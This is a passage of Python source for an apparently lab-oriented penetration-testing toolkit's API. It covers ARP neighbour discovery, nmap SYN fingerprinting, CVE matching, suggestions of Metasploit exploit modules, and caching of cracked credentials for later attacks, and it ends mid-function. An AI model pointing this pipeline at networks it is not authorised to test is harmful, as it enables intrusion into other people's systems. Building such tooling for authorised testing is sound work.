# REST endpoints for launching, caching, aborting, exporting and attacking.
import asyncio
import json
import logging
import socket
import sqlite3
import time
import uuid
from collections.abc import AsyncIterator
from contextlib import suppress
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from fastapi import APIRouter, BackgroundTasks, HTTPException
from fastapi.responses import StreamingResponse
from schemas import (
    ADBloodhoundRequest,
    ADMitm6Request,
    ADResponderRequest,
    AircrackRequest,
    AircrackResult,
    AttackRequest,
    BatchScanRequest,
    BatchScanResult,
    ContainerEscapeResult,
    DBInterrogateRequest,
    DeepAttackRequest,
    FuzzRequest,
    Job,
    JohnRequest,
    JohnResult,
    LateralRequest,
    NmapNSERequest,
    NmapNSEResult,
    NucleiRequest,
    NucleiResult,
    PaginatedJobs,
    Report,
    ScanRequest,
    SqlmapRequest,
    SqlmapResult,
    TsharkRequest,
    TsharkResult,
    VulnLeadsRequest,
    ZapRequest,
    ZapResult,
)
from services.cve_lookup import CveDb
from services.discovery import NeighborFinder
from services.msfrpc import MsfClient
from services.report import build_report
from services.scan_pipeline import ScanPipeline, _ScanAbort

logger = logging.getLogger("h4k.routers.scan")

router = APIRouter(prefix="/api")

# In-memory job + scan-cache stores (single-lab deployment; fine for this project).
JOBS: dict[str, dict[str, Any]] = {}
_scan_cache: dict[str, dict[str, Any]] = {}
CACHE_TTL_SECONDS = 300  # re-serve a matching recent scan within 5 minutes

_neighbors_cache: dict[str, list[dict[str, Any]]] = {}
_neighbor_jobs: dict[str, dict[str, Any]] = {}
_fingerprint_jobs: dict[str, dict[str, Any]] = {}
_attack_cache: dict[str, list[dict[str, Any]]] = {}

_NEIGHBOR_DB = Path("/opt/h4k/data/neighbors.db")
_NEIGHBOR_DB.parent.mkdir(parents=True, exist_ok=True)


def _neighbor_db() -> sqlite3.Connection:
    conn = sqlite3.connect(_NEIGHBOR_DB, timeout=10)
    conn.execute(
        "CREATE TABLE IF NOT EXISTS discovered_hosts ("
        "  ip          TEXT PRIMARY KEY,"
        "  mac         TEXT,"
        "  vendor      TEXT,"
        "  hostname    TEXT,"
        "  os_guess    TEXT,"
        "  discovered_at TEXT NOT NULL"
        ")"
    )
    conn.execute(
        "CREATE TABLE IF NOT EXISTS discovered_services ("
        "  ip          TEXT NOT NULL,"
        "  port        INTEGER NOT NULL,"
        "  proto       TEXT NOT NULL DEFAULT 'tcp',"
        "  service     TEXT,"
        "  version     TEXT,"
        "  product     TEXT,"
        "  state       TEXT,"
        "  scanned_at  TEXT NOT NULL,"
        "  PRIMARY KEY (ip, port, proto)"
        ")"
    )
    conn.execute(
        "CREATE TABLE IF NOT EXISTS discovered_service_vulns ("
        "  ip          TEXT NOT NULL,"
        "  port        INTEGER NOT NULL,"
        "  proto       TEXT NOT NULL DEFAULT 'tcp',"
        "  kind        TEXT NOT NULL,"  # 'cve' or 'lead'
        "  vid         TEXT NOT NULL,"  # CVE id, or lead product@version
        "  severity    REAL,"
        "  detail      TEXT,"
        "  found_at    TEXT NOT NULL,"
        "  PRIMARY KEY (ip, port, proto, kind, vid)"
        ")"
    )
    # auxiliary/post matches are recon leads, not exploitable findings
    conn.execute(
        "DELETE FROM discovered_service_vulns WHERE kind='cve' AND detail LIKE '%msf: auxiliary/%'"
    )
    conn.execute(
        "DELETE FROM discovered_service_vulns WHERE kind='cve' AND detail LIKE '%msf: post/%'"
    )
    conn.commit()
    return conn


def _save_neighbor_host(
    ip: str,
    mac: str | None,
    vendor: str | None,
    hostname: str | None,
    os_guess: str | None = None,
) -> None:
    from datetime import UTC, datetime

    if os_guess is None:
        os_guess = _vendor_to_os(vendor) if vendor else None

    conn = _neighbor_db()
    conn.execute(
        "INSERT OR REPLACE INTO discovered_hosts (ip, mac, vendor, hostname, os_guess, discovered_at) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (ip, mac, vendor, hostname, os_guess, datetime.now(UTC).isoformat()),
    )
    conn.commit()


def _save_neighbor_services(ip: str, services: list[dict[str, Any]]) -> None:
    from datetime import UTC, datetime

    conn = _neighbor_db()
    conn.execute("DELETE FROM discovered_services WHERE ip = ?", (ip,))
    now = datetime.now(UTC).isoformat()
    for svc in services:
        conn.execute(
            "INSERT OR REPLACE INTO discovered_services (ip, port, proto, service, version, product, state, scanned_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (
                ip,
                svc.get("port"),
                svc.get("proto", "tcp"),
                svc.get("service"),
                svc.get("version"),
                svc.get("product"),
                svc.get("state"),
                now,
            ),
        )
    conn.commit()


def _load_neighbor_services() -> dict[str, list[dict[str, Any]]]:
    conn = _neighbor_db()
    rows = conn.execute(
        "SELECT ip, port, proto, service, version, product, state FROM discovered_services"
    ).fetchall()
    conn.close()
    out: dict[str, list[dict[str, Any]]] = {}
    for r in rows:
        entry = {
            "port": r[1],
            "proto": r[2],
            "service": r[3],
            "version": r[4],
            "product": r[5],
            "state": r[6],
        }
        out.setdefault(r[0], []).append(entry)
    return out


def _save_service_vulns(
    ip: str, port: int, proto: str, rows: list[dict[str, Any]]
) -> None:
    from datetime import UTC, datetime

    conn = _neighbor_db()
    now = datetime.now(UTC).isoformat()
    for v in rows:
        conn.execute(
            "INSERT OR REPLACE INTO discovered_service_vulns "
            "(ip, port, proto, kind, vid, severity, detail, found_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (
                ip,
                port,
                proto,
                v.get("kind", "cve"),
                v.get("vid", ""),
                v.get("severity"),
                v.get("detail"),
                now,
            ),
        )
    conn.commit()


def _load_neighbor_vulns() -> list[dict[str, Any]]:
    conn = _neighbor_db()
    rows = conn.execute(
        "SELECT ip, port, proto, kind, vid, severity, detail FROM discovered_service_vulns ORDER BY severity DESC"
    ).fetchall()
    conn.close()
    return [
        {
            "ip": r[0],
            "port": r[1],
            "proto": r[2],
            "kind": r[3],
            "vid": r[4],
            "severity": r[5],
            "detail": r[6],
        }
        for r in rows
    ]


def _load_neighbor_hosts() -> dict[str, dict[str, Any]]:
    conn = _neighbor_db()
    rows = conn.execute(
        "SELECT ip, mac, vendor, hostname, os_guess FROM discovered_hosts"
    ).fetchall()
    conn.close()
    return {
        r[0]: {"ip": r[0], "mac": r[1], "vendor": r[2], "hostname": r[3], "os": r[4]}
        for r in rows
    }


_attack_jobs: dict[str, dict[str, Any]] = {}


def _get_msf() -> MsfClient | None:
    from app_state import msf_client

    return msf_client


def _get_cve_db() -> CveDb | None:
    with suppress(Exception):
        from app_state import cve_db

        return cve_db
    return None


def _cache_key(req: ScanRequest) -> str:
    # depth MUST be part of the key: a cached top-1000 result must never be
    # served to a caller who asked for a full 1-65535 sweep.
    depth = getattr(req, "depth", None)
    return (
        f"{req.mode.value}::{req.target}::"
        f"depth={depth.value if depth else 'standard'}::"
        f"creds={int(req.try_default_creds)}::"
        f"attack={int(req.do_attack)}"
    )


def _pull_cached(req: ScanRequest) -> dict[str, Any] | None:
    key = _cache_key(req)
    entry = _scan_cache.get(key)
    if not entry:
        return None
    created = entry.get("created")
    if created and (time.time() - created) < CACHE_TTL_SECONDS:
        return entry
    _scan_cache.pop(key, None)
    return None


def _run_scan(job: dict[str, Any], req: ScanRequest) -> None:
    msf = _get_msf()
    if msf is None:
        _update(
            job,
            status="error",
            error="msfrpcd client unavailable",
            message="scan failed",
        )
        return
    report_model: Report | None = None  # noqa: F841

    def _log(msg: str) -> None:
        job.setdefault("log", []).append(msg)
        _update(job, log=job["log"])

    def _stop() -> bool:
        return job.get("status") == "abort_requested"

    pipeline = ScanPipeline(
        msf,
        progress=lambda msg, pct: _update(job, message=msg, progress=pct),
        log=_log,
        should_stop=_stop,
    )
    try:
        raw = pipeline.run(req)
        report = build_report(
            target=req.target,
            mode=req.mode.value,
            hosts=raw.get("hosts", []),
            vulns=raw.get("vulns", []),
            notes=raw.get("notes", []),
            cve_db=_get_cve_db(),
            fingerprints=raw.get("fingerprints", []),
            credentials=raw.get("credentials", []),
            attacks=raw.get("attacks", []),
            security=raw.get("security", []),
            log=job.get("log", []),
            coverage=raw.get("coverage"),
        )
        _scan_cache[_cache_key(req)] = {
            "created": time.time(),
            "report": report.model_dump(),
        }
        # remember verified creds for later opt-in attacks on this target
        _attack_cache[req.target] = raw.get("credentials", [])
        _update(
            job, status="done", progress=100.0, report=report, message="scan complete"
        )
    except _ScanAbort:
        _log("scan aborted")
        _update(
            job, status="aborted", message="scan aborted by operator", progress=100.0
        )
    except Exception as exc:
        logger.exception("scan failed")
        _update(job, status="error", error=str(exc), message="scan failed")


def _update(job: dict[str, Any], **kwargs: Any) -> None:
    job.update(kwargs)
    job["updated"] = datetime.now(UTC).isoformat()


@router.post("/scan", response_model=Job)
def create_scan(req: ScanRequest, background: BackgroundTasks) -> Job:
    # Serve from cache if we scanned the same target+mode recently.
    cached = _pull_cached(req)
    if cached:
        report = Report(**cached["report"])
        cached_job: dict[str, Any] = {
            "id": uuid.uuid4().hex[:12],
            "target": req.target,
            "status": "done",
            "progress": 100.0,
            "message": "served from cache",
            "report": report,
            "error": None,
            "cached": True,
            "created": datetime.now(UTC).isoformat(),
            "log": ["served from recent scan cache"],
        }
        JOBS[cached_job["id"]] = cached_job
        return Job(**cached_job)

    job: dict[str, Any] = {
        "id": uuid.uuid4().hex[:12],
        # the monitor lists jobs by target, and the report is null until the
        # run finishes, so the target has to live on the job itself
        "target": req.target,
        "status": "queued",
        "progress": 0.0,
        "message": "queued",
        "report": None,
        "error": None,
        "cached": False,
        "created": datetime.now(UTC).isoformat(),
        "log": [],
    }
    job_id = job["id"]
    JOBS[job_id] = job
    background.add_task(_run_scan, job, req)
    logger.info("scan job %s started for %s (%s)", job_id, req.target, req.mode)
    return Job(**job)


@router.post("/scan/batch", response_model=BatchScanResult)
def batch_scan(req: BatchScanRequest, background: BackgroundTasks) -> BatchScanResult:
    """Launch scans against up to 50 targets in a single call.

    Each target gets its own job. Jobs are tracked independently and can be
    monitored via GET /api/jobs or GET /api/jobs/{id}/stream.
    """
    if len(req.targets) > 50:
        raise HTTPException(status_code=422, detail="max 50 targets per batch")
    if not req.targets:
        raise HTTPException(status_code=422, detail="at least one target required")

    import uuid as uuid_mod

    jobs: list[Job] = []
    for target in req.targets:
        job = {
            "id": uuid_mod.uuid4().hex[:12],
            "target": target,
            "status": "queued",
            "progress": 0.0,
            "message": "queued",
            "report": None,
            "error": None,
            "cached": False,
            "created": datetime.now(UTC).isoformat(),
            "log": [],
        }
        JOBS[job["id"]] = job
        req_for_target = ScanRequest(
            target=target,
            mode=req.mode,
            depth=req.depth,
            do_dns_recon=req.do_dns_recon,
            do_vuln_scan=req.do_vuln_scan,
            try_default_creds=req.try_default_creds,
            open_sessions=req.open_sessions,
            do_attack=req.do_attack,
        )
        background.add_task(_run_scan, job, req_for_target)
        jobs.append(Job(**job))

    batch_id = uuid_mod.uuid4().hex[:12]
    logger.info("batch scan %s launched with %d targets", batch_id, len(jobs))
    return BatchScanResult(
        batch_id=batch_id,
        jobs=jobs,
        launched=len(jobs),
        message=f"Launched {len(jobs)} scans. Monitor at GET /api/jobs",
    )


@router.post("/scan/{job_id}/abort", response_model=Job)
def abort_scan(job_id: str) -> Job:
    job = JOBS.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="job not found")
    if job.get("status") in ("done", "error", "aborted"):
        return Job(**job)
    job["status"] = "abort_requested"
    job.setdefault("log", []).append("abort requested by operator")
    _update(job)
    return Job(**job)


# statuses that mean "still in flight" — everything else is terminal.
ACTIVE_STATUSES = ("queued", "running", "abort_requested")


def _job_summary(kind: str, job: dict[str, Any]) -> dict[str, Any]:
    """Normalize one job from any store into the monitor's common shape.

    `progress` stays None for job families that never report a percentage: a
    hydra run has no meaningful percentage and showing 0% would read as
    "stalled" when it is actually working.
    """
    raw_progress = job.get("progress")
    return {
        "id": job.get("id"),
        "type": kind,
        "target": job.get("target") or job.get("host"),
        "status": job.get("status", "unknown"),
        "progress": float(raw_progress) if raw_progress is not None else None,
        "message": job.get("message") or "",
        "created": job.get("created"),
        "updated": job.get("updated"),
    }


def _all_jobs(active_only: bool = False) -> list[dict[str, Any]]:
    """Merge every job store, newest first.

    Without this the UI can only rediscover a job from an id it happens to be
    holding in a browser variable, so anything started elsewhere (another tab,
    before a reload, curl) is invisible while it is still running.
    """
    out: list[dict[str, Any]] = []
    # One dict per family because the shapes differ (scan has progress+report,
    # deepattack has per-tool results). Resolved lazily: the toolkit/fuzz stores
    # are declared further down this module.
    stores = (
        ("scan", JOBS),
        ("attack", _attack_jobs),
        ("deepattack", _toolkit_jobs),
        ("fuzz", _fuzz_jobs),
    )
    for kind, store in stores:
        for job in store.values():
            if active_only and job.get("status") not in ACTIVE_STATUSES:
                continue
            out.append(_job_summary(kind, job))
    out.sort(key=lambda j: j.get("created") or "", reverse=True)
    return out


@router.get("/jobs", response_model=PaginatedJobs)
def list_jobs(
    active: bool = False,
    page: int = 1,
    per_page: int = 20,
    limit: int = 100,
) -> PaginatedJobs:
    """Enumerate every job family (scan / attack / deepattack / fuzz).

    Supports cursor-free pagination via `page` + `per_page`. Also accepts the
    legacy `limit` param for backward compatibility (returns first `limit` items).
    """
    everything = _all_jobs()
    jobs = (
        [j for j in everything if j["status"] in ACTIVE_STATUSES]
        if active
        else everything
    )

    # Backward compat: if limit < per_page * 2, use legacy slice behaviour
    if limit < per_page * 2:
        return PaginatedJobs(
            jobs=[Job(**j) for j in jobs[:limit]],
            total=len(everything),
            active=sum(1 for j in everything if j["status"] in ACTIVE_STATUSES),
            page=1,
            per_page=limit,
            pages=1,
        )

    total = len(jobs)
    pages = max(1, (total + per_page - 1) // per_page)
    page = max(1, min(page, pages))
    start = (page - 1) * per_page
    end = start + per_page

    return PaginatedJobs(
        jobs=[Job(**j) for j in jobs[start:end]],
        total=total,
        active=sum(1 for j in everything if j["status"] in ACTIVE_STATUSES),
        page=page,
        per_page=per_page,
        pages=pages,
    )


@router.get("/jobs/{job_id}", response_model=Job)
def get_job(job_id: str) -> Job:
    job = JOBS.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="job not found")
    return Job(**job)


@router.get("/jobs/{job_id}/stream")
async def stream_job_events(job_id: str) -> StreamingResponse:
    """Server-Sent Events (SSE) stream of job log entries.

    Emits events as the job runs:
    - `event: log   data: {"line": "..."}`
    - `event: progress data: {"pct": 45}`
    - `event: status data: {"status": "running", "stage": "scan"}
    - `event: complete data: {"status": "completed"}`
    - `event: error data: {"error": "..."}

    Clients connect and receive pushed updates instead of polling `/jobs/{id}`.
    """

    async def event_stream() -> AsyncIterator[str]:
        last_log_len = 0
        job = JOBS.get(job_id)
        if not job:
            yield f"event: error\ndata: {json.dumps({'error': 'job not found'})}\n\n"
            return

        # Send initial state
        yield f"event: status\ndata: {json.dumps({'status': job.get('status', 'queued'), 'progress': job.get('progress', 0)})}\n\n"

        while True:
            await asyncio.sleep(1.5)
            job = JOBS.get(job_id)
            if not job:
                yield f"event: error\ndata: {json.dumps({'error': 'job not found'})}\n\n"
                break

            status = job.get("status", "running")
            progress = job.get("progress", 0)

            # Stream new log lines
            log = job.get("log", [])
            if len(log) > last_log_len:
                for line in log[last_log_len:]:
                    yield f"event: log\ndata: {json.dumps({'line': line})}\n\n"
                last_log_len = len(log)

            yield f"event: progress\ndata: {json.dumps({'pct': progress})}\n\n"

            if status in ("completed", "failed", "aborted", "error"):
                yield f"event: complete\ndata: {json.dumps({'status': status})}\n\n"
                break

    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


@router.get("/report/{job_id}", response_model=Report)
def get_report(job_id: str) -> Report:
    job = JOBS.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="job not found")
    report = job.get("report")
    if report is None:
        raise HTTPException(status_code=404, detail="report not ready")
    return report


@router.get("/export/{job_id}")
def export_report(job_id: str, fmt: str = "json") -> dict[str, Any]:
    job = JOBS.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="job not found")
    report = job.get("report")
    if report is None:
        raise HTTPException(status_code=404, detail="report not ready")
    report = Report(**report) if not isinstance(report, Report) else report

    fmt = fmt.lower()
    if fmt == "json":
        content = json.dumps(report.model_dump(), indent=2)
        name = f"h4k-{job_id}.json"
    elif fmt in ("md", "markdown", "txt"):
        content = _report_markdown(report)
        name = f"h4k-{job_id}.md"
    else:
        raise HTTPException(status_code=400, detail="format must be json or md")
    return {
        "job_id": job_id,
        "format": fmt,
        "filename": name,
        "content": content,
    }


@router.get("/neighbors")
def neighbors(cidr: str | None = None) -> dict[str, Any]:
    """Discover hosts on the local network via ARP (arp-scan / arp cache / msf)."""
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")
    if not cidr:
        cidr = "192.168.1.0/24"
    key = cidr
    if key in _neighbors_cache:
        return {"neighbors": _neighbors_cache[key], "cache": True}
    finder = NeighborFinder(msf)
    found = finder.discover(cidr)
    data = NeighborFinder.neighbors_to_dicts(found)
    _neighbors_cache[key] = data
    return {"neighbors": data, "cache": False}


@router.post("/neighbors/scan")
def neighbors_scan(background: BackgroundTasks) -> dict[str, Any]:
    """Start a local-network neighbor discovery job in the background.

    Returns a job_id that can be polled at GET /neighbors/status/{job_id}.
    Discovered hosts are immediately added to the MSF workspace so they
    appear in the network graph without requiring a full port scan.
    """
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")

    job_id = uuid.uuid4().hex[:12]
    job: dict[str, Any] = {
        "id": job_id,
        "status": "running",
        "progress": 0.0,
        "message": "discovering neighbors...",
        "hosts": [],
        "error": None,
        "created": datetime.now(UTC).isoformat(),
    }
    _neighbor_jobs[job_id] = job
    background.add_task(_run_neighbor_discovery, job, msf)
    return {"job_id": job_id, "status": "running"}


def _run_neighbor_discovery(job: dict[str, Any], msf: MsfClient) -> None:
    try:
        from services.discovery import NeighborFinder

        finder = NeighborFinder(msf)
        default_cidr = "192.168.1.0/24"

        def _progress(msg: str, pct: float) -> None:
            _update(job, message=msg, progress=pct)

        _progress("arp scanning...", 10)
        found = finder.discover(default_cidr)
        _progress("processing results...", 80)

        data = NeighborFinder.neighbors_to_dicts(found)
        job["hosts"] = data

        for h in found:
            ip = h.ip
            if not ip or ":" in ip or len(ip.split(".")) != 4:
                continue
            _save_neighbor_host(ip, h.mac, h.vendor, h.hostname)

        _update(
            job, status="done", progress=100.0, message=f"found {len(data)} host(s)"
        )
        _neighbors_cache[default_cidr] = data
    except Exception as exc:
        logger.exception("neighbor discovery failed")
        _update(job, status="error", error=str(exc), message="discovery failed")


def _vendor_to_os(vendor: str | None) -> str | None:
    if not vendor:
        return None
    vendor_lower = vendor.lower()
    if any(x in vendor_lower for x in ("raspberry", "pi")):
        return "Linux"
    if any(x in vendor_lower for x in ("vmware", "virtualbox", "qemu", "xen")):
        return "Linux"
    if any(
        x in vendor_lower
        for x in (
            "cisco",
            "mikrotik",
            "ubiquiti",
            "netgear",
            "tp-link",
            "dlink",
            "asus",
        )
    ):
        return "Linux"
    if any(x in vendor_lower for x in ("microsoft", "windows")):
        return "Windows"
    if any(x in vendor_lower for x in ("apple", "mac")):
        return "macOS"
    return None


@router.get("/neighbors/status/{job_id}")
def neighbors_status(job_id: str) -> dict[str, Any]:
    job = _neighbor_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="neighbor scan job not found")
    return job


@router.get("/neighbors/jobs")
def neighbors_jobs() -> dict[str, Any]:
    """Return all neighbor discovery jobs, newest first."""
    jobs = sorted(
        _neighbor_jobs.values(), key=lambda j: j.get("created") or "", reverse=True
    )
    return {
        "jobs": [
            {
                "id": j["id"],
                "status": j["status"],
                "progress": j.get("progress"),
                "message": j.get("message"),
                "hosts": j.get("hosts", []),
                "created": j.get("created"),
            }
            for j in jobs
        ]
    }


@router.post("/neighbors/fingerprint")
def neighbors_fingerprint(background: BackgroundTasks) -> dict[str, Any]:
    """Run an nmap service/version/OS fingerprint scan across all discovered
    neighbor hosts.

    Runs: nmap -sV -sC -O --top-ports 100 -vvv -Pn
    Results are stored in the neighbors.db and merged into the graph endpoint.
    """
    neighbor_hosts = _load_neighbor_hosts()
    if not neighbor_hosts:
        raise HTTPException(
            status_code=400, detail="no neighbor hosts found — run discovery first"
        )

    job_id = uuid.uuid4().hex[:12]
    job: dict[str, Any] = {
        "id": job_id,
        "status": "running",
        "progress": 0.0,
        "message": "preparing fingerprint scan...",
        "results": [],
        "error": None,
        "created": datetime.now(UTC).isoformat(),
    }
    _fingerprint_jobs[job_id] = job
    background.add_task(_run_fingerprint, job, list(neighbor_hosts.values()))
    return {"job_id": job_id, "status": "running"}


def _run_fingerprint(job: dict[str, Any], neighbors: list[dict[str, Any]]) -> None:
    logger.info("_run_fingerprint starting with %d neighbors", len(neighbors))
    try:
        from services.toolkit import ToolkitRunner

        runner = ToolkitRunner(
            progress=lambda msg, pct: _update(job, message=msg, progress=pct)
        )
        ips = [n["ip"] for n in neighbors if n.get("ip")]
        total = len(ips)

        def _tick(msg: str, pct: float) -> None:
            _update(job, message=msg, progress=pct)

        _tick(f"scanning {total} host(s) one by one...", 5)

        all_results: list[dict[str, Any]] = []
        for i, ip in enumerate(ips):
            if job.get("status") == "abort_requested":
                break
            argv = [
                "nmap",
                "-sS",
                "-T4",
                "-Pn",
                "-p",
                "22,80,443,445,3389,8080,8443,21,23,25,53,110,143,3306,5432,5900,6379,9200",
                "--max-retries",
                "1",
                "--host-timeout",
                "8s",
                "-oX",
                "-",
                ip,
            ]
            result = runner.run_tool("nmap", argv, timeout=15)
            parsed = (
                _parse_nmap_xml(result["stdout"]) if result["status"] == "ok" else []
            )
            for entry in parsed:
                entry["neighbor_info"] = next(
                    (n for n in neighbors if n.get("ip") == entry["ip"]), {}
                )
            # correlate known vulns per open service while we are here
            for entry in parsed:
                for svc in entry.get("services", []):
                    if svc.get("state") != "open":
                        continue
                    hits = _match_service_vulns(entry["ip"], svc)
                    svc["vulns"] = [
                        {
                            k: v
                            for k, v in h.items()
                            if k in ("kind", "vid", "severity", "detail")
                        }
                        for h in hits
                    ]
                    if hits:
                        _save_service_vulns(
                            entry["ip"], svc["port"], svc.get("proto", "tcp"), hits
                        )
            all_results.extend(parsed)
            job["results"] = all_results
            _tick(f"scanned {i + 1}/{total}: {ip}", 5 + int((i / total) * 85))

        _tick("saving results...", 92)

        for entry in all_results:
            ip = entry.get("ip")
            if not ip:
                continue
            n_info = entry.pop("neighbor_info", {}) or {}
            mac = entry.get("mac") or n_info.get("mac")
            services = entry.get("services", [])
            _save_neighbor_host(
                ip,
                mac,
                entry.get("vendor") or n_info.get("vendor"),
                entry.get("hostname") or n_info.get("hostname"),
                os_guess=entry.get("os"),
            )
            if services:
                _save_neighbor_services(ip, services)

        _tick(f"fingerprint complete — {len(all_results)} host(s) with open ports", 100)
        _update(job, status="done", progress=100.0)
    except Exception as exc:
        logger.exception("fingerprint failed: %s", exc)
        _update(job, status="error", error=str(exc), message="fingerprint failed")


def _parse_nmap_xml(xml_output: str) -> list[dict[str, Any]]:
    import re

    results: list[dict[str, Any]] = []
    host_blocks = re.split(r"<host ", xml_output)
    for block in host_blocks[1:]:
        ip_match = re.search(r'<address addr="([0-9.]+)" addrtype="ipv4"', block)
        mac_match = re.search(r'<address addr="([0-9a-f:]+)" addrtype="mac"', block)
        vendor_match = re.search(r'<vendor name="([^"]+)"', block)
        hostname_match = re.search(r'<hostname name="([^"]+)"', block)
        os_match = re.search(r'<osclass type="([^"]+)" osfamily="([^"]+)"', block)

        if not ip_match:
            continue
        ip = ip_match.group(1)
        services: list[dict[str, Any]] = []
        for proto, port, port_block in re.findall(
            r'<port protocol="([^"]+)" portid="([^"]+)">(.*?)</port>', block, re.DOTALL
        ):
            state_match = re.search(r'state state="([^"]+)"', port_block)
            svc_match = re.search(r'service name="([^"]+)"', port_block)
            version_match = re.search(r'version="([^"]+)"', port_block)
            product_match = re.search(r'product="([^"]+)"', port_block)
            services.append(
                {
                    "port": int(port),
                    "proto": proto,
                    "state": state_match.group(1) if state_match else "unknown",
                    "service": svc_match.group(1) if svc_match else None,
                    "version": version_match.group(1) if version_match else None,
                    "product": product_match.group(1) if product_match else None,
                }
            )

        results.append(
            {
                "ip": ip,
                "mac": mac_match.group(1) if mac_match else None,
                "vendor": vendor_match.group(1) if vendor_match else None,
                "hostname": hostname_match.group(1) if hostname_match else None,
                "os": (os_match.group(2) or "").strip() if os_match else None,
                "services": services,
            }
        )
    return results


def _match_service_vulns(ip: str, svc: dict[str, Any]) -> list[dict[str, Any]]:
    """Match a fingerprinted service against the offline CVE db + version leads.

    Returns [{kind, vid, severity, detail}] — `kind` is 'cve' for CVE db hits
    (severity = CVSS) or 'lead' for heuristic outdated/beta-version flags.
    """
    out: list[dict[str, Any]] = []
    banner = " ".join(
        filter(None, (svc.get("service"), svc.get("product"), svc.get("version")))
    )
    if not banner:
        return out

    cve_db = _get_cve_db()
    if cve_db is not None:
        from schemas import Service as SvcSchema

        pseudo = SvcSchema(
            port=svc.get("port") or 0,
            proto=svc.get("proto", "tcp"),
            service=svc.get("service"),
            state=svc.get("state"),
            info=banner,
        )
        version = svc.get("version")
        product = svc.get("product")
        seen: set[str] = set()
        for cve in cve_db.match_service(pseudo, version=version, product=product):
            vid = cve.get("id", "")
            if vid in seen:
                continue
            msf_module = cve.get("msf_module") or ""
            # auxiliary scanner matches (ssh_enumusers etc.) are recon leads,
            # not exploitable findings — leave them out of Likely Vulnerable
            if msf_module.startswith(("auxiliary/", "post/")):
                continue
            seen.add(vid)
            detail = cve.get("title") or cve.get("description") or ""
            if cve.get("msf_module"):
                detail = f"{detail} | msf: {cve['msf_module']}"
            severity = cve.get("severity")
            if not severity:
                cvss = float(cve.get("cvss") or 0.0)
                severity = (
                    "CRITICAL"
                    if cvss >= 9
                    else "HIGH" if cvss >= 7 else "MEDIUM" if cvss >= 4 else "LOW"
                )
            out.append(
                {
                    "kind": "cve",
                    "vid": vid,
                    "severity": float(cve.get("cvss") or 0.0) or None,
                    "detail": f"{severity}: {detail}" if detail else severity,
                }
            )

    from services.vulnleads import analyze_service

    for lead in analyze_service(ip, svc.get("service") or "", banner):
        out.append(
            {
                "kind": "lead",
                "vid": f"{lead.get('product')}@{lead.get('version')}",
                "severity": None,
                "detail": f"{lead.get('level')}: {lead.get('reason')}"
                + (f" (see {lead['cve_link']})" if lead.get("cve_link") else ""),
            }
        )
    return out


@router.get("/neighbors/vulns")
def neighbors_vulns() -> dict[str, Any]:
    """Known vulnerabilities correlated against fingerprinted neighbor services."""
    vulns = _load_neighbor_vulns()
    return {"vulns": vulns, "count": len(vulns)}


@router.get("/exploit-candidates")
def exploit_candidates(service: str, port: int | None = None) -> dict[str, Any]:
    """Alternative MSF exploit modules for a failed-finding escalation ladder.

    Offline-first: modules attached to CVEs that mention this service, plus the
    static service->module map. (Iterating every MSF module over RPC is slow
    and unreliable — the curated path is faster and more relevant.)
    """
    blob = f"{service} {port or ''}".lower()
    mods: list[str] = []
    cve_db = _get_cve_db()
    if cve_db is not None:
        for cve in cve_db.cves:
            mod = cve.get("msf_module") or ""
            if not mod.startswith("exploit/"):
                continue
            svc_list = [s.lower() for s in cve.get("service", [])]
            prod = str(cve.get("product", "")).lower()
            if service.lower() in svc_list or prod in blob or prod == service.lower():
                mods.append(mod)
    try:
        from services.attack import STATIC_SERVICE_MODULES

        s = service.lower()
        mapped = STATIC_SERVICE_MODULES.get(s)
        if not mapped:
            for key, module in STATIC_SERVICE_MODULES.items():
                if key in s:
                    mapped = module
                    break
        if mapped:
            mods.append(mapped)
    except Exception:  # pragma: no cover - defensive
        pass
    mods = list(dict.fromkeys(mods))[:12]
    return {"service": service, "candidates": mods, "count": len(mods)}


@router.get("/neighbors/fingerprint/status/{job_id}")
def fingerprint_status(job_id: str) -> dict[str, Any]:
    job = _fingerprint_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="fingerprint job not found")
    return job


@router.get("/neighbors/fingerprint/results/{job_id}")
def fingerprint_results(job_id: str) -> dict[str, Any]:
    job = _fingerprint_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="fingerprint job not found")
    if job["status"] != "done":
        raise HTTPException(status_code=202, detail="scan not yet complete")
    return {"results": job.get("results", []), "count": len(job.get("results", []))}


@router.get("/graph")
def get_graph() -> dict[str, Any]:
    """Return the current MSF workspace as a host->port->service graph,
    merged with any neighbor hosts discovered via /api/neighbors/scan that
    have not yet been port-scanned.

    Graph shape:
      nodes:  [{id, label, type, os, vendor, service_count}]
      edges:  [{source, target, type, port, service, state}]
    """
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")

    workspace = msf.current_workspace()
    hosts = msf.hosts(workspace)
    services = msf.services(workspace)

    msf_node_ids: set[str] = set()
    nodes = []
    for h in hosts:
        addr = h.get("host") or h.get("address")
        if not addr:
            continue
        msf_node_ids.add(addr)
        nodes.append(
            {
                "id": addr,
                "label": addr,
                "type": "host",
                "os": h.get("os"),
                "vendor": h.get("name"),
                "service_count": 0,
            }
        )

    edges = []
    svc_count_by_host: dict[str, int] = {}
    for s in services:
        host = s.get("host") or s.get("address")
        port = s.get("port")
        if not host or port is None:
            continue
        svc_count_by_host[host] = svc_count_by_host.get(host, 0) + 1
        edges.append(
            {
                "source": host,
                "target": f"{host}:{port}",
                "type": "service",
                "port": port,
                "proto": s.get("proto", "tcp"),
                "service": s.get("name"),
                "state": s.get("state"),
                "info": s.get("info"),
            }
        )

    neighbor_svcs = _load_neighbor_services()
    for ip, info in _load_neighbor_hosts().items():
        if ip in msf_node_ids:
            continue
        vendor = info.get("vendor")
        hostname = info.get("hostname")
